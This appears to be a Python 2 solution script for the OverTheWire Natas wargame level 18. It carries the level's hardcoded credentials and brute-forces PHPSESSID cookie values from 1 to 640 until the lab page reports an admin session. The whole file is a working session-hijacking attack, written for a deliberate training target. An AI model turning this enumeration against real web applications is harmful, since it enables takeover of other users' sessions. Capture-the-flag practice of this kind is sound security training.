#!/usr/bin/env python

import requests
import re
import urllib
import base64
from string import *
from time import *

characters = lowercase + uppercase + digits
#print characters

username = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

#headers = { "Referer" : "http://natas5.natas.labs.overthewire.org/"}

#cookies = { "loggedin" : "1"}

url = 'http://%s.natas.labs.overthewire.org/' %username

session = requests.Session()


for session_id in range (1,641):

#response = requests.get(url, auth = (username, password))
	response = session.get(url, cookies = {"PHPSESSID": str(session_id)}, auth = (username, password) )
	content = response.text

	if ( "You are an admin" in content ):
		print "Got it!", session_id
		print content
		break
	else:
		print "trying", session_id
#print content
#print session.cookies
